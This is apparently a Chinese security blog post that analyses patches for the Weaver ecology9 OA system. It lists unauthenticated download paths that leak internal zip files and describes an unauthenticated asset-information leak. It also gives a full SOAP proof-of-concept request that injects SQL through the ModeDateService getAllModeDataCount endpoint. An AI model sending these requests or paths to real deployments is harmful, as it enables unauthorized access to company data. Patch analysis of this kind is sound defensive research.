#  泛微ecology9 1day分析   
 安全绘景   2024-12-18 07:18  
  
## 0x01 前言  
  
挺久没发文了，这段时间也忙，然后也是不知道写什么，发下看泛微的时候记的部分笔记吧，水水，冒个泡证明还在。  
  
**0x02 分析**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nBD2rodfa0dfLkI0DmibOYibYBVib8f8iacBaYmLqmRDCE2S8grGMyX7PAw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nr3uP1OVj4icNrzpygIx11y66emdGPdrEyLxhyCNnRS4ej8VTXn7gDAQ/640?wx_fmt=png&from=appmsg "")  
  
下载补丁包，根据官方更新的时间，编写脚本筛选对应时间的补丁文件  
。  
  
可结合安全通告进一步确定漏洞类型。  
  
脚本代码：  
```
import os
import argparse
from datetime import datetime

def find_files_by_modification_date(folder_path, target_date):
    files = []
    for root, dirs, filenames in os.walk(folder_path):
        for filename in filenames:
            file_path = os.path.join(root, filename)
            modification_time = os.path.getmtime(file_path)
            modification_date = datetime.fromtimestamp(modification_time).date()
            if modification_date == target_date:
                files.append(file_path)
    return files

def main():
    parser = argparse.ArgumentParser(description="按修改日期查找文件。")
    parser.add_argument("folder_path", type=str, help="要搜索的文件夹路径")
    parser.add_argument("target_date", type=str, help="目标修改日期，格式为 YYYY-MM-DD")

    args = parser.parse_args()
    folder_path = args.folder_path
    target_date = datetime.strptime(args.target_date, "%Y-%m-%d").date()

    files = find_files_by_modification_date(folder_path, target_date)
    for file in files:
        print(file)

if __name__ == "__main__":
    main()
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nicomtfCES5JKKRBFjv4DIOJwNRp3AqxM82LHv3DsCvbSQNALvhTY0qQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nUvRJxicCcGicib5ia3Sh5u4dgCwbIzJ6lTe4Tjw4gB5ib06ibw57oZH3GZoQ/640?wx_fmt=png&from=appmsg "")  
  
随便挑几个日期的看看。  
  
0816  
  
上图，可以看到更新了几个文件，打开发现内容为error。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nnfbpiaQlDF98jLDdcWhMJzXfkSx0QR96UG9OCYMZqBHJuOWgz53ml8A/640?wx_fmt=png&from=appmsg "")  
  
在未打补丁机器访问：  
  
/cloudstore/ecode/setup/ecology_dev.zip  
  
/integration/weaversso/summary_cfg/ecology_sso_guide.zip  
  
/integration/weaversso/summary_cfg/ecology_sso_guide_en.zip  
  
/integration/weaversso/summary_dev/ecology_sso_dev_guide.zip  
  
/integration/weaversso/summary_dev/ecology_sso_dev_guide_en.zip  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5npA3PPib8DHB78XvgsZz2UVibhoxspfrhD81ibKeiaNJkZfd197p0IpvJeg/640?wx_fmt=png&from=appmsg "")  
  
0815  
  
官方通告中提到敏感信息泄露与越权登录漏洞。  
  
根据脚本的输出，搜索SecurityRuelForCpt。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nVgOYpZzdbzgu7q12JZmoBhuAHjCenicBgibXt77a2lgfPm0ia6V4oUFGQ/640?wx_fmt=png&from=appmsg "")  
  
这里只分析信息泄露。未做鉴权，可根据资产id查出公司采购的商品及价格。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5n2SjVkQiaT2MSdX2Tl5k0L3zwkHtOksQY0I76sQRib3F4Sxgm2qyxa1uw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5noWXgasCHibJZia2gsAHfd2Dxzew5UicaRavoSkJyQdCgYN2qibAB4iaib2ZQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nY6QV1FKcqTX3nBIH1dzNc4kiaUNJDaxKcjdGLCKV6fJ7I2jSsLDia48A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5n3UnRicsBfq3fpm4WvGEIBopeskwSoBoo7icWWhXFLCzPxVL2f4GdE1AQ/640?wx_fmt=png&from=appmsg "")  
  
0715  
  
这里只看ModeDateService吧，WorkPlanService网上挺多的了。  
  
搜索ModeDateServiceXmlRule，跟进vaildate方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nd9D3SSeniaYHVZsQgibYT26XLeibytxDCCykpXuiaBWBEAibT9FBtj0jibcg/640?wx_fmt=png&from=appmsg "")  
  
可以看到进一步过滤的方法，随便看一个。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nKyF0Q576E4Pibyzq3DFEoLicB6kEMTHtxibXCpFVkkhyZib6PKzSPs37Zg/640?wx_fmt=png&from=appmsg "")  
  
很明显，拼接参数三。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nn45ibcZEYGvBeWgiatCfd4E1yBIfFs7OXdKWfGtNLU3nO5fAmepl70ew/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nUNfmKK6UMqrVjowZNO4rV6DFK7G5PPcd1XnWeMoKU8prrOzua89icgg/640?wx_fmt=png&from=appmsg "")  
  
  
最终的sql语句大概是这个样子：  
```
select id from main_table t1,share_table t2 where 1=1 and t1.id = t2.sourceid and 1 = 1
```  
  
  
1=1 为我们拼接的内容。  
```
POST /services/ModeDateService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx//services/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaasJ-HspHcxI5r2Krufz; JSESSIONID=aaasJ-HspHcxI5r2Krufz
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: xxx 
Content-Length: 405

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
   <soapenv:Header/>
   <soapenv:Body>
      <mod:getAllModeDataCount>
         <mod:in0>1</mod:in0>
         <mod:in1>1</mod:in1>
         <mod:in2>1=1</mod:in2>
         <mod:in3>1</mod:in3>
      </mod:getAllModeDataCount>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nUfgiaeN2J2oF03xMOGWlFYM1SoAeeC9FtMzO1ic6PSibnJdE6DoibFWOyg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5nMvBicF0atthF78sWCF36Aw71OlGGOSkn4xOVicvPKldicMxoz8IAvQT7A/640?wx_fmt=png&from=appmsg "")  
  
  
0806  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5niaqkKrDFNPvVaN22YZMd8KEbraNPodzy8bacPvxj16YbQOJGqmFm00A/640?wx_fmt=png&from=appmsg "")  
  
笔记就发这一点吧，xdm可以看看。  
  
  
**0x03 小密圈‍‍‍‍‍‍‍‍**  
最后送你一张优惠券，欢迎加入小密圈，好朋友。  
  
报考安全证书也欢迎滴滴。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/9zZrDr2DM8Nxx3Yiavu5AvXibcceE5St5n8omoorMzy9nMQhzM2EOyHo3Ktv34w5anrVtyiauG6seJZT9ibBmvK2VA/640?wx_fmt=jpeg&from=appmsg "")  
  
